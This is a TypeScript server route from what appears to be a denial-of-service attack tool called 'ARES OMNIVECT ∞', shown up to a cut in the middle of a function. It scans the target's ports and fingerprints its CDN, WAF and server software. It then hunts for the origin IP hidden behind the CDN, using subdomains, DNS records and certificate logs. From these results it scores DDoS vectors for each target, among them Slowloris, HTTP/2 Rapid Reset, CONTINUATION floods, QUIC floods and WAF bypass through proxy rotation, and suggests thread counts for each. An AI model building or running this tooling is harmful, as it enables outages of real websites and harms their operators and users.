/**
 * ANALYZE ROUTE — intelligent target profiling (v3)
 *
 * Probes the target deeply: HTTP/HTTPS, port scanning, WAF detection,
 * HTTP/2 + HTTP/3 support, GraphQL endpoint, WebSocket support,
 * TLS info, CDN/WAF provider, origin IP discovery, and produces server-aware
 * ranked recommendations for all 30 ARES OMNIVECT ∞ attack vectors.
 *
 * Server-aware scoring:
 *   nginx       → conn-flood S (worker_connections), http-pipeline A, slowloris B
 *   Apache      → slowloris S (thread-per-conn), rudy-v2 S, http-flood A
 *   IIS         → http-flood A, syn-flood A, slowloris C
 *   LiteSpeed   → http2-flood S, http-flood A, conn-flood B
 *   Node/Express→ http-flood S (blocks event loop), conn-flood A
 *   Caddy/Go    → http-flood A, conn-flood A
 *   Cloudflare  → waf-bypass A, dns-amp S (NS servers unprotected), conn-flood B
 *   Unknown     → generic scoring
 */
import { Router, type IRouter } from "express";
import dns from "node:dns/promises";
import net from "node:net";
import https from "node:https";
import { AnalyzeTargetBody } from "@workspace/api-zod";

const router: IRouter = Router();

interface MethodRec {
  method:           string;
  name:             string;
  score:            number;
  reason:           string;
  suggestedThreads: number;
  suggestedDuration: number;
  protocol:         string;
  amplification:    number;
  tier:             "S" | "A" | "B" | "C" | "D";
  simulated?:       boolean;
}

type ServerType =
  | "nginx" | "apache" | "iis" | "litespeed" | "caddy"
  | "nodejs" | "cloudflare" | "openresty" | "gunicorn"
  | "tomcat" | "jetty" | "gocache" | "azion" | "varnish" | "unknown";

function tierFromScore(score: number): "S" | "A" | "B" | "C" | "D" {
  if (score >= 90) return "S";
  if (score >= 75) return "A";
  if (score >= 60) return "B";
  if (score >= 45) return "C";
  return "D";
}

// ── TCP port scanner — 2s timeout per port ─────────────────────────────────
async function scanPort(host: string, port: number): Promise<boolean> {
  return new Promise(resolve => {
    const sock = net.createConnection({ host, port });
    const t = setTimeout(() => { sock.destroy(); resolve(false); }, 2000);
    sock.once("connect", () => { clearTimeout(t); sock.destroy(); resolve(true); });
    sock.once("error",   () => { clearTimeout(t); resolve(false); });
  });
}

async function scanPorts(host: string, ports: number[]): Promise<number[]> {
  const results = await Promise.all(
    ports.map(async p => ({ port: p, open: await scanPort(host, p) }))
  );
  return results.filter(r => r.open).map(r => r.port);
}

// ── CDN / WAF detection ────────────────────────────────────────────────────
function detectCDN(headers: Headers): { isCDN: boolean; provider: string } {
  const cfRay   = headers.get("cf-ray");
  const server  = (headers.get("server") || "").toLowerCase();
  const via     = (headers.get("via") || "").toLowerCase();
  const xCache  = (headers.get("x-cache") || "").toLowerCase();
  const xServed = headers.get("x-served-by") || "";
  const xAkamai = headers.get("x-check-cacheable") || headers.get("x-akamai-transformed") || "";
  const xVercel = headers.get("x-vercel-cache") || headers.get("x-vercel-id") || "";

  // ── Cloudflare
  if (cfRay || server.includes("cloudflare"))                           return { isCDN: true, provider: "Cloudflare" };
  // ── Akamai
  if (server.includes("akamai") || xAkamai)                             return { isCDN: true, provider: "Akamai" };
  // ── Fastly
  if (server.includes("fastly") || via.includes("fastly"))              return { isCDN: true, provider: "Fastly" };
  if (xServed.includes("cache"))                                        return { isCDN: true, provider: "Fastly" };
  // ── AWS CloudFront
  if (server.includes("awselb") || server.includes("amazonaws"))        return { isCDN: true, provider: "AWS CloudFront" };
  if (headers.get("x-amz-cf-id") || headers.get("x-amz-cf-pop"))       return { isCDN: true, provider: "AWS CloudFront" };
  // ── Vercel Edge
  if (xVercel)                                                          return { isCDN: true, provider: "Vercel Edge" };
  // ── Sucuri WAF
  if (server.includes("sucuri") || headers.get("x-sucuri-id"))          return { isCDN: true, provider: "Sucuri WAF" };
  // ── DDoS-Guard
  if (headers.get("x-ddos-protect") || headers.get("x-ddos-detection")) return { isCDN: true, provider: "DDoS-Guard" };
  // ── Imperva Incapsula
  if (headers.get("x-iinfo") || headers.get("x-cdn") === "imperva")     return { isCDN: true, provider: "Imperva Incapsula" };
  // ── Bunny CDN
  if (headers.get("x-arequestid") || via.includes("bunny"))             return { isCDN: true, provider: "Bunny CDN" };
  // ── GoCache (Brazilian CDN/WAF)
  if (server.includes("gocache") || headers.get("x-gocache-status") || headers.get("x-gocache-request-id")) {
    return { isCDN: true, provider: "GoCache" };
  }
  // ── Azion (Brazilian CDN)
  if (server.includes("azion") || headers.get("x-azion-cache") || headers.get("x-azion-request-id")) {
    return { isCDN: true, provider: "Azion" };
  }
  // ── CDN77 / Edgio
  if (server.includes("cdn77") || headers.get("x-cache-status")?.includes("CDN77"))  return { isCDN: true, provider: "CDN77" };
  if (server.includes("edgio") || headers.get("x-edgio-version"))       return { isCDN: true, provider: "Edgio" };
  // ── KeyCDN
  if (headers.get("x-cache") === "HIT" && headers.get("x-edge-ip"))     return { isCDN: true, provider: "KeyCDN" };
  // ── Limelight / Edgio
  if (via.includes("llnwd") || via.includes("limelight"))                return { isCDN: true, provider: "Limelight/Edgio" };
  // ── Cloudflare Workers via header
  if (headers.get("cf-cache-status"))                                    return { isCDN: true, provider: "Cloudflare" };
  // ── Generic CDN (cache hit via Via/x-cache)
  if (xCache.includes("hit") || via.includes("squid"))                   return { isCDN: true, provider: "Generic CDN/Proxy" };
  return { isCDN: false, provider: "" };
}

// ── WAF detection (separate from CDN) ─────────────────────────────────────
function detectWAF(headers: Headers, body: string): { hasWAF: boolean; wafProvider: string } {
  const server  = (headers.get("server") || "").toLowerCase();
  const powered = (headers.get("x-powered-by") || "").toLowerCase();
  const via     = (headers.get("via") || "").toLowerCase();
  const bodyLc  = body.toLowerCase();

  if (headers.get("x-sucuri-id"))                                       return { hasWAF: true, wafProvider: "Sucuri WAF" };
  if (headers.get("x-waf-event-info"))                                  return { hasWAF: true, wafProvider: "Barracuda WAF" };
  if (headers.get("x-protected-by")?.toLowerCase().includes("imperva")) return { hasWAF: true, wafProvider: "Imperva WAF" };
  if (headers.get("x-iinfo"))                                           return { hasWAF: true, wafProvider: "Imperva Incapsula" };
  if (server.includes("imunify360"))                                    return { hasWAF: true, wafProvider: "Imunify360" };
  if (powered.includes("mod_security") || body.includes("mod_security")) return { hasWAF: true, wafProvider: "ModSecurity" };
  if (headers.get("x-fw-hash") || headers.get("x-fw-server"))          return { hasWAF: true, wafProvider: "Fortinet FortiGate" };
  if (via.includes("qualys"))                                           return { hasWAF: true, wafProvider: "Qualys WAF" };
  // GoCache WAF (Brazilian)
  if (server.includes("gocache") || headers.get("x-gocache-status"))   return { hasWAF: true, wafProvider: "GoCache WAF" };
  // Azion WAF (Brazilian)
  if (server.includes("azion") || headers.get("x-azion-cache"))        return { hasWAF: true, wafProvider: "Azion WAF" };
  // AWS WAF
  if (headers.get("x-amzn-requestid") && bodyLc.includes("forbidden")) return { hasWAF: true, wafProvider: "AWS WAF" };
  // Cloudflare WAF (via challenge/block page)
  if (bodyLc.includes("cloudflare") && bodyLc.includes("ray id"))      return { hasWAF: true, wafProvider: "Cloudflare WAF" };
  // Wordfence (WordPress WAF)
  if (bodyLc.includes("wordfence") || bodyLc.includes("generated by wordfence")) return { hasWAF: true, wafProvider: "Wordfence" };
  // Generic
  if (bodyLc.includes("access denied") && bodyLc.includes("security")) return { hasWAF: true, wafProvider: "Generic WAF/Firewall" };
  return { hasWAF: false, wafProvider: "" };
}

// ── HTTP/2 + HTTP/3 detection ──────────────────────────────────────────────
function detectHTTPVersions(headers: Headers): { supportsH2: boolean; supportsH3: boolean; altSvc: string } {
  const altSvc = headers.get("alt-svc") || "";
  const supportsH3 = altSvc.includes("h3") || altSvc.includes("h3-29") || altSvc.includes("h3-Q");
  // HTTP/2 is harder to detect from headers alone; check for h2 upgrade or known H2 indicators
  const supportsH2 = altSvc.includes("h2") || !!headers.get("x-firefox-http3") || supportsH3;
  return { supportsH2, supportsH3, altSvc };
}

// ── HSTS detection ─────────────────────────────────────────────────────────
function detectHSTS(headers: Headers): { hasHSTS: boolean; maxAge: number; includeSubdomains: boolean } {
  const hsts = headers.get("strict-transport-security") || "";
  if (!hsts) return { hasHSTS: false, maxAge: 0, includeSubdomains: false };
  const match = hsts.match(/max-age=(\d+)/);
  const maxAge = match ? parseInt(match[1], 10) : 0;
  return { hasHSTS: true, maxAge, includeSubdomains: hsts.includes("includeSubDomains") };
}

function detectServerType(serverHeader: string, headers: Headers | null): ServerType {
  const s = serverHeader.toLowerCase();
  if (s.includes("cloudflare"))                                      return "cloudflare";
  if (s.includes("openresty") || s.includes("tengine"))              return "openresty";
  if (s.includes("nginx"))                                           return "nginx";
  if (s.includes("apache"))                                          return "apache";
  if (s.includes("microsoft-iis") || s.includes("iis"))             return "iis";
  if (s.includes("litespeed") || s.includes("ls web"))              return "litespeed";
  if (s.includes("caddy"))                                          return "caddy";
  if (s.includes("gunicorn") || s.includes("uvicorn") || s.includes("hypercorn")) return "gunicorn";
  if (s.includes("tomcat") || s.includes("jboss") || s.includes("wildfly")) return "tomcat";
  if (s.includes("jetty") || s.includes("glassfish"))               return "jetty";
  if (s.includes("gocache"))                                        return "gocache";
  if (s.includes("azion"))                                          return "azion";
  if (s.includes("varnish"))                                        return "varnish";

  if (headers) {
    const powered = (headers.get("x-powered-by") || "").toLowerCase();
    if (powered.includes("express") || powered.includes("node"))    return "nodejs";
    if (powered.includes("php"))                                    return "apache";
    if (powered.includes("asp.net") || powered.includes("iis"))     return "iis";
    if (powered.includes("servlet") || powered.includes("java"))    return "tomcat";
    // GoCache/Azion via other headers
    if (headers.get("x-gocache-status") || headers.get("x-gocache-request-id")) return "gocache";
    if (headers.get("x-azion-cache")    || headers.get("x-azion-request-id"))   return "azion";
  }

  return "unknown";
}

const SERVER_LABELS: Record<ServerType, string> = {
  nginx:       "nginx",
  apache:      "Apache",
  iis:         "Microsoft IIS",
  litespeed:   "LiteSpeed",
  caddy:       "Caddy",
  nodejs:      "Node.js",
  cloudflare:  "Cloudflare Workers",
  openresty:   "OpenResty/nginx",
  gunicorn:    "Python WSGI",
  tomcat:      "Apache Tomcat",
  jetty:       "Eclipse Jetty",
  gocache:     "GoCache CDN/WAF",
  azion:       "Azion CDN/WAF",
  varnish:     "Varnish Cache",
  unknown:     "Unknown",
};

// ── Cloudflare IP ranges (for origin discovery) ────────────────────────────
const CF_CIDRS_ANALYZE = [
  "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
  "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
  "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
  "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
].map(cidr => {
  const [ip, mask] = cidr.split("/");
  const p = ip.split(".").map(Number);
  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
  const m = mask === "0" ? 0 : (~((1 << (32 - Number(mask))) - 1)) >>> 0;
  return [n, m, (n & m) >>> 0] as [number, number, number];
});

// Cloudflare IPv6 prefixes (exact prefix match is sufficient for /29–/32 ranges)
const CF_IPV6_PREFIXES = [
  "2400:cb00:", "2606:4700:", "2803:f800:",
  "2405:b500:", "2405:8100:", "2a06:98c0:", "2c0f:f248:",
];

function isCloudflareIPAnalyze(ip: string): boolean {
  // IPv6 check
  if (ip.includes(":")) {
    const lower = ip.toLowerCase();
    return CF_IPV6_PREFIXES.some(p => lower.startsWith(p));
  }
  // IPv4 check
  const p = ip.split(".").map(Number);
  if (p.length !== 4 || p.some(x => isNaN(x))) return false;
  const n = ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
  return CF_CIDRS_ANALYZE.some(([, m, net]) => (n & m) === net);
}

// ── crt.sh SSL certificate history (queries expired certs too) ────────────
async function queryCrtShAnalyze(domain: string): Promise<string[]> {
  const hosts = new Set<string>();
  const url = `https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`;
  const data = await new Promise<unknown>(resolve => {
    const req = https.get(url, {
      headers: { "User-Agent": "Mozilla/5.0 (compatible; SecurityResearch/1.0)", Accept: "application/json" },
      rejectUnauthorized: false, timeout: 14000,
    }, res => {
      let d = ""; res.on("data", c => { d += c; }); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
    });
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
  if (!Array.isArray(data)) return [];
  const arr = data as Array<{ name_value?: string; common_name?: string }>;
  for (const cert of arr) {
    const names = [cert.name_value, cert.common_name].filter(Boolean).join("\n");
    for (const name of names.split("\n")) {
      const h = name.trim().replace(/^\*\./, "").toLowerCase();
      if (h && h.includes(".") && !h.includes("*") && h.endsWith(domain)) hosts.add(h);
    }
  }
  return [...hosts].slice(0, 40);
}

// ── Full origin IP finder — runs when CDN is detected ─────────────────────
// Returns: { originIP, source, confidence }
async function findOriginIP(
  hostname: string,
  allIPs:   string[],
): Promise<{ originIP: string | null; source: string; confidence: "high" | "medium" | "low" }> {
  const BYPASS_SUBS = [
    "direct", "mail", "smtp", "origin", "backend", "server",
    "api", "staging", "www2", "cpanel", "ftp", "webmail",
    "admin", "old", "backup", "dev", "ns1", "ns2",
    "pop", "imap", "relay", "host", "vpn", "ssh",
  ];

  // 1. Bypass subdomains
  const subResults = await Promise.allSettled(
    BYPASS_SUBS.map(async sub => {
      const ips = await dns.resolve4(`${sub}.${hostname}`).catch(() => [] as string[]);
      return { sub, ips };
    })
  );
  for (const r of subResults) {
    if (r.status !== "fulfilled") continue;
    for (const ip of r.value.ips) {
      if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
        return { originIP: ip, source: `subdomain:${r.value.sub}.${hostname}`, confidence: "high" };
      }
    }
  }

  // 2. IPv6 AAAA (often not proxied through Cloudflare free plan)
  try {
    const ipv6 = await dns.resolve6(hostname).catch(() => [] as string[]);
    if (ipv6.length > 0) return { originIP: ipv6[0], source: "IPv6 AAAA record", confidence: "high" };
  } catch { /* no IPv6 */ }

  // 3. SPF/TXT records
  try {
    const txts = await dns.resolveTxt(hostname).catch(() => [] as string[][]);
    for (const parts of txts) {
      const spf = parts.join(" ");
      const ms = spf.match(/ip4:([\d./]+)/g);
      if (ms) {
        for (const entry of ms) {
          const candidate = entry.slice(4).split("/")[0];
          if (candidate && !isCloudflareIPAnalyze(candidate) && !allIPs.includes(candidate)) {
            return { originIP: candidate, source: "SPF TXT record", confidence: "medium" };
          }
        }
      }
    }
  } catch { /* no TXT */ }

  // 4. MX records
  try {
    const mx = await dns.resolveMx(hostname).catch(() => [] as { exchange: string; priority: number }[]);
    for (const { exchange } of mx) {
      const mxIPs = await dns.resolve4(exchange).catch(() => [] as string[]);
      for (const ip of mxIPs) {
        if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
          return { originIP: ip, source: `MX record (${exchange})`, confidence: "medium" };
        }
      }
    }
  } catch { /* no MX */ }

  // 5. crt.sh SSL certificate history
  const crtHosts = await queryCrtShAnalyze(hostname).catch(() => [] as string[]);
  const crtResults = await Promise.allSettled(
    crtHosts.map(async host => {
      const ips = await dns.resolve4(host).catch(() => [] as string[]);
      return { host, ips };
    })
  );
  for (const r of crtResults) {
    if (r.status !== "fulfilled") continue;
    for (const ip of r.value.ips) {
      if (!isCloudflareIPAnalyze(ip) && !allIPs.includes(ip)) {
        return { originIP: ip, source: `crt.sh cert history (${r.value.host})`, confidence: "medium" };
      }
    }
  }

  return { originIP: null, source: "", confidence: "low" };
}

function scoreMethodsFor(opts: {
  isIP:              boolean;
  httpAvailable:     boolean;
  httpsAvailable:    boolean;
  responseTimeMs:    number;
  serverHeader:      string;
  serverType:        ServerType;
  isCDN:             boolean;
  cdnProvider:       string;
  hasWAF:            boolean;
  wafProvider:       string;
  hasDNS:            boolean;
  supportsH2:        boolean;
  supportsH3:        boolean;
  openPorts:         number[];
  hasGraphQL:        boolean;
  hasWebSocket:      boolean;
  hostname:          string;
  originIP?:         string | null;
  originSource?:     string;
}): MethodRec[] {
  const {
    isIP, httpAvailable, httpsAvailable, responseTimeMs,
    serverType, isCDN, cdnProvider, hasWAF, hasDNS,
    supportsH2, supportsH3, openPorts, hasGraphQL, hasWebSocket,
    originIP, originSource,
  } = opts;
  const isWebServer = httpAvailable || httpsAvailable;
  const isSlowResponder     = responseTimeMs > 300;
  const isVerySlowResponder = responseTimeMs > 800;
  const isFastResponder     = responseTimeMs > 0 && responseTimeMs < 100;
  const hasAlt8080  = openPorts.includes(8080);
  const hasAlt8443  = openPorts.includes(8443);

  const recs: MethodRec[] = [];

  const serverNote = (fallback: string): string => {
    const notes: Partial<Record<ServerType, string>> = {
      nginx:      `nginx worker_connections model — each connection slot is global, exhausted before rate limiting`,
      apache:     `Apache uses 1 thread/process per connection — every open socket blocks a worker permanently`,
      iis:        `IIS uses async I/O — HTTP flood and SYN flood effective; Slowloris less impactful`,
      litespeed:  `LiteSpeed has built-in DDoS protection — HTTP/2 multiplexing and conn-flood most effective bypass`,
      caddy:      `Caddy/Go uses goroutines — overwhelm with high-concurrency HTTP flood and conn-flood`,
      nodejs:     `Node.js is single-threaded — HTTP flood saturates the event loop completely`,
      cloudflare: `Cloudflare Workers — L7 highly mitigated; waf-bypass, dns-amp (NS unprotected), and L4 most effective`,
      openresty:  `OpenResty/nginx — same worker_connections limit as nginx; conn-flood is primary vector`,
      gunicorn:   `Python WSGI server — synchronous workers; slowloris and http-flood extremely effective`,
      tomcat:     `Apache Tomcat uses thread pools — slowloris and http-flood exhaust thread pool rapidly`,
      gocache:    `GoCache CDN/WAF (Brazilian) — cache-poison, waf-bypass and origin-bypass most effective; L4 direct to origin IPs`,
      azion:      `Azion CDN/WAF (Brazilian) — waf-bypass + cache-poison effective; origin likely on AWS/GCP infrastructure`,
      varnish:    `Varnish Cache — cache-buster (unique query params) forces 100% origin pass-through; no rate limiting on Varnish itself`,
    };
    return notes[serverType] ?? fallback;
  };

  // ── HTTP Flood ─────────────────────────────────────────────────────────
  if (isWebServer) {
    let score = isCDN ? 62 : 85;
    if (serverType === "nodejs")  score = isCDN ? 70 : 95;
    if (serverType === "gunicorn" || serverType === "tomcat") score = isCDN ? 68 : 90;
    if (serverType === "litespeed") score = isCDN ? 60 : 78;
    if (isFastResponder) score += 5;
    score = Math.min(score, 99);
    recs.push({
      method: "http-flood", name: "HTTP Flood",
      score, tier: tierFromScore(score),
      reason: serverNote(`HTTP server at ${responseTimeMs}ms — direct request flood highly effective`),
      suggestedThreads: serverType === "nodejs" ? 200 : isCDN ? 300 : 150,
      suggestedDuration: 90, protocol: "HTTP", amplification: 1,
    });
  }

  // ── HTTP Pipeline Flood ────────────────────────────────────────────────
  if (isWebServer) {
    let score = isCDN ? 68 : 88;
    if (serverType === "nginx" || serverType === "openresty") score = Math.min(score + 8, 96);
    if (serverType === "apache") score = Math.min(score + 6, 94);
    if (serverType === "cloudflare") score = Math.max(score - 10, 55);
    recs.push({
      method: "http-pipeline", name: "HTTP Pipeline Flood",
      score, tier: tierFromScore(score),
      reason: `128 requests per TCP write, no wait — 300K+ req/s per worker thread. Bypasses per-request rate limits.`,
      suggestedThreads: 1200, suggestedDuration: 90, protocol: "HTTP/1.1", amplification: 1,
    });
  }

  // ── Slowloris ──────────────────────────────────────────────────────────
  if (isWebServer) {
    let score = 40;
    if (isSlowResponder)     score = 70;
    if (isVerySlowResponder) score = 85;
    if (serverType === "apache")  score = Math.min(score + 22, 96);
    if (serverType === "gunicorn") score = Math.min(score + 18, 94);
    if (serverType === "tomcat")  score = Math.min(score + 16, 92);
    if (serverType === "nginx")   score = Math.max(score - 8, 30);
    if (serverType === "nodejs")  score = Math.max(score - 5, 35);
    if (serverType === "litespeed") score = Math.max(score - 12, 25);
    if (serverType === "iis")     score = Math.max(score - 10, 28);
    if (isCDN) score = Math.max(score - 22, 15);

    const slowDesc = serverType === "apache"
      ? `Apache thread-per-connection — every half-open socket blocks a worker thread permanently. Extremely effective.`
      : serverType === "gunicorn"
        ? `Python WSGI worker — synchronous model means each Slowloris connection holds a worker process completely`
        : serverType === "tomcat"
          ? `Tomcat thread pool exhaustion — each Slowloris socket occupies 1 thread until the pool is starved`
          : isSlowResponder
            ? `Slow server (${responseTimeMs}ms) — connection exhaustion via trickling headers very effective`
            : serverNote(`HTTP server — Slowloris holds connections open, starving server connection pool`);

    recs.push({
      method: "slowloris", name: "Slowloris",
      score: Math.max(15, score), tier: tierFromScore(score),
      reason: slowDesc,
      suggestedThreads: serverType === "apache" ? 80 : 64,
      suggestedDuration: 300, protocol: "TCP", amplification: 1,
    });
  }

  // ── RUDY v2 Slow POST ──────────────────────────────────────────────────
  if (isWebServer) {
    let score = serverType === "apache" ? 92 : serverType === "gunicorn" ? 88 : serverType === "tomcat" ? 85 : 65;
    if (isCDN) score = Math.max(score - 20, 30);
    recs.push({
      method: "rudy-v2", name: "RUDY v2 — Slow POST",
      score, tier: tierFromScore(score),
      reason: `multipart/form-data body trickle (1 byte/10s) — server must hold thread open waiting for closing boundary`,
      suggestedThreads: 120, suggestedDuration: 300, protocol: "HTTP", amplification: 1,
    });
  }

  // ── TLS Connection Flood ───────────────────────────────────────────────
  if (isWebServer) {
    let score = isVerySlowResponder ? 85 : isSlowResponder ? 78 : 72;
    if (serverType === "nginx" || serverType === "openresty") score = Math.min(score + 18, 97);
    if (serverType === "litespeed") score = Math.min(score + 12, 90);
    if (serverType === "caddy")     score = Math.min(score + 8, 88);
    if (serverType === "nodejs")    score = Math.min(score + 6, 86);
    if (serverType === "iis")       score = Math.max(score - 5, 60);
    if (isCDN) score = Math.max(score - 20, 48);

    const connDesc = serverType === "nginx" || serverType === "openresty"
      ? `nginx worker_connections limit — TLS sockets exhaust ${serverType} worker slots before rate limiting activates`
      : serverType === "litespeed"
        ? `LiteSpeed connection table overflow — bypasses HTTP rate limiting, exhausts TLS acceptance queue directly`
        : isCDN
          ? `CDN behind target — conn-flood bypasses ${cdnProvider} L7 rules by operating at raw TLS level`
          : `TLS handshake storm — opens 16,000 simultaneous connections, exhausting server fd pool`;

    recs.push({
      method: "conn-flood", name: "TLS Connection Flood",
      score, tier: tierFromScore(score),
      reason: connDesc,
      suggestedThreads: 200, suggestedDuration: 300, protocol: "TCP/TLS", amplification: 1,
    });
  }

  // ── Geass WAF Bypass ───────────────────────────────────────────────────
  if (httpsAvailable && (isCDN || hasWAF)) {
    const baseScore = cdnProvider === "Cloudflare" ? 90
      : cdnProvider === "Akamai" ? 87
      : cdnProvider === "AWS CloudFront" ? 84
      : cdnProvider === "Fastly" ? 82
      : cdnProvider === "GoCache" ? 88      // Brazilian CDN — less sophisticated WAF rules
      : cdnProvider === "Azion" ? 85        // Brazilian CDN — waf bypass highly effective
      : cdnProvider === "Sucuri WAF" ? 86
      : cdnProvider === "Imperva Incapsula" ? 83
      : hasWAF ? 80
      : 76;
    recs.push({
      method: "waf-bypass", name: "Hydra WAF Bypass",
      score: baseScore, tier: tierFromScore(baseScore),
      reason: cdnProvider === "GoCache"
        ? `GoCache CDN/WAF (BR) detected — WAF rules generally simpler than Cloudflare/Akamai; JA3 fingerprint randomization + custom header ordering bypasses most GoCache rules effectively`
        : cdnProvider === "Azion"
          ? `Azion CDN/WAF (BR) detected — JA3 TLS fingerprint randomization + Chrome-exact SETTINGS bypass Azion's DDoS filtering layer`
          : `${isCDN ? cdnProvider : "WAF"} detected — JA3 TLS fingerprint randomization + Chrome-exact HTTP/2 AKAMAI SETTINGS + precise header ordering. Each request appears as a distinct real Chrome browser — indistinguishable from legitimate traffic.`,
      suggestedThreads: 200, suggestedDuration: 180, protocol: "HTTP/2", amplification: 1,
    });
  }

  // ── HTTP Bypass (Chrome fingerprint + proxy rotation) ─────────────────
  if (isWebServer && (isCDN || hasWAF)) {
    recs.push({
      method: "http-bypass", name: "HTTP Bypass (Proxy Rotation)",
      score: 78, tier: "A",
      reason: `${isCDN ? cdnProvider : "WAF/CDN"} detected — Chrome fingerprint + 100+ proxy IPs rotation bypasses per-IP rate limits. Each request from a different IP, mimicking organic traffic.`,
      suggestedThreads: 300, suggestedDuration: 180, protocol: "HTTP", amplification: 1,
    });
  }

  // ── HTTP/2 Rapid Reset (CVE-2023-44487) ───────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 60 : 85;
    if (serverType === "litespeed") score = isCDN ? 72 : 93;
    if (serverType === "nginx")     score = isCDN ? 64 : 87;
    if (serverType === "nodejs")    score = isCDN ? 60 : 82;
    if (serverType === "iis")       score = isCDN ? 57 : 80;
    if (serverType === "cloudflare") score = 45;
    if (supportsH2) score = Math.min(score + 5, 98); // confirmed H2 = more effective
    recs.push({
      method: "http2-flood", name: "HTTP/2 Rapid Reset (CVE-2023-44487)",
      score, tier: tierFromScore(score),
      reason: supportsH2
        ? `H2 confirmed (Alt-Svc) — 512-stream RST burst per session, millions req/s bypassing per-IP limits`
        : serverType === "cloudflare"
          ? `Cloudflare patches H2 rapid reset — limited; use waf-bypass + dns-amp for CDN bypass instead`
          : `HTTPS endpoint — HTTP/2 multiplexed streams bypass per-IP limits, each connection carries 128 simultaneous streams`,
      suggestedThreads: serverType === "litespeed" ? 80 : 64,
      suggestedDuration: 60, protocol: "HTTP/2", amplification: 1.5,
    });
  }

  // ── H2 CONTINUATION Flood (CVE-2024-27316) ────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 55 : 88;
    if (serverType === "nginx")  score = isCDN ? 60 : 92; // nginx ≤1.25.4 unpatched, OOM guaranteed
    if (serverType === "apache") score = isCDN ? 62 : 90;
    if (supportsH2) score = Math.min(score + 3, 98);
    recs.push({
      method: "http2-continuation", name: "H2 CONTINUATION Flood (CVE-2024-27316)",
      score, tier: tierFromScore(score),
      reason: serverType === "nginx"
        ? `nginx ≤1.25.4 — endless CONTINUATION frames force header buffering without limits → guaranteed OOM. No patch for older versions.`
        : `HTTP/2 CONTINUATION frames sent without END_HEADERS flag — server buffers headers indefinitely until memory exhaustion`,
      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
    });
  }

  // ── HPACK Bomb ─────────────────────────────────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 52 : 82;
    if (supportsH2) score = Math.min(score + 5, 92);
    recs.push({
      method: "hpack-bomb", name: "HPACK Bomb (RFC 7541)",
      score, tier: tierFromScore(score),
      reason: `RFC 7541 incremental-indexed headers — forces HPACK dynamic table eviction storm, CPU + memory drain. No CVE, no specific fix.`,
      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
    });
  }

  // ── H2 Settings Storm ─────────────────────────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 55 : 84;
    if (supportsH2) score = Math.min(score + 6, 92);
    recs.push({
      method: "h2-settings-storm", name: "H2 Settings Storm",
      score, tier: tierFromScore(score),
      reason: `SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain. Proven 326K pps in testing.`,
      suggestedThreads: 64, suggestedDuration: 90, protocol: "HTTP/2", amplification: 1,
    });
  }

  // ── TLS Renegotiation ─────────────────────────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 58 : 78;
    if (serverType === "apache" || serverType === "nginx") score = Math.min(score + 8, 86);
    recs.push({
      method: "tls-renego", name: "TLS Renegotiation DoS",
      score, tier: tierFromScore(score),
      reason: `Forces TLS 1.2 renegotiation — expensive RSA public-key operation per connection on server CPU. Saturates crypto thread pool.`,
      suggestedThreads: 100, suggestedDuration: 120, protocol: "TLS", amplification: 1,
    });
  }

  // ── SSL Death Record ───────────────────────────────────────────────────
  if (httpsAvailable) {
    let score = isCDN ? 50 : 76;
    recs.push({
      method: "ssl-death", name: "SSL Death Record",
      score, tier: tierFromScore(score),
      reason: `1-byte TLS application records — forces server to do 40K AES-GCM decrypts/sec on server CPU, saturates crypto queue`,
      suggestedThreads: 200, suggestedDuration: 90, protocol: "TLS", amplification: 1,
    });
  }

  // ── QUIC/HTTP3 Flood ───────────────────────────────────────────────────
  if (supportsH3 || httpsAvailable) {
    let score = supportsH3 ? 84 : 68;
    if (isCDN) score = Math.max(score - 10, 50);
    recs.push({
      method: "quic-flood", name: "QUIC/HTTP3 Flood (RFC 9000)",
      score, tier: tierFromScore(score),
      reason: supportsH3
        ? `H3 confirmed (Alt-Svc) — QUIC Initial packets with unique DCID per packet; server allocates crypto state per DCID → OOM`
        : `QUIC Initial packet flood against port 443/UDP — each unique DCID forces server crypto state allocation`,
      suggestedThreads: 64, suggestedDuration: 60, protocol: "QUIC/UDP", amplification: 1,
    });
  }

  // ── WebSocket Exhaustion ───────────────────────────────────────────────
  if (hasWebSocket || isWebServer) {
    let score = hasWebSocket ? 85 : (isWebServer ? 60 : 40);
    if (isCDN) score = Math.max(score - 15, 35);
    recs.push({
      method: "ws-flood", name: "WebSocket Exhaustion",
      score, tier: tierFromScore(score),
      reason: hasWebSocket
        ? `WebSocket support confirmed — holds thousands of WS connections open, 1 goroutine/thread per connection on server`
        : `WebSocket endpoint likely exists — exhausts server's goroutine/thread pool with persistent connections`,
      suggestedThreads: 150, suggestedDuration: 180, protocol: "WebSocket", amplification: 1,
    });
  }

  // ── GraphQL DoS ────────────────────────────────────────────────────────
  if (hasGraphQL || isWebServer) {
    let score = hasGraphQL ? 88 : 52;
    if (isCDN) score = Math.max(score - 10, 40);
    recs.push({
      method: "graphql-dos", name: "GraphQL Fragment Bomb",
      score, tier: tierFromScore(score),
      reason: hasGraphQL
        ? `GraphQL endpoint confirmed — fragment spread explosion creates O(fragments × fields) resolver CPU exhaustion. Single query = 1000× server work.`
        : `GraphQL endpoint probe inconclusive — if present, fragment bombs cause exponential resolver CPU exhaustion`,
      suggestedThreads: 100, suggestedDuration: 90, protocol: "HTTP", amplification: 1,
    });
  }

  // ── CDN Cache Poison ───────────────────────────────────────────────────
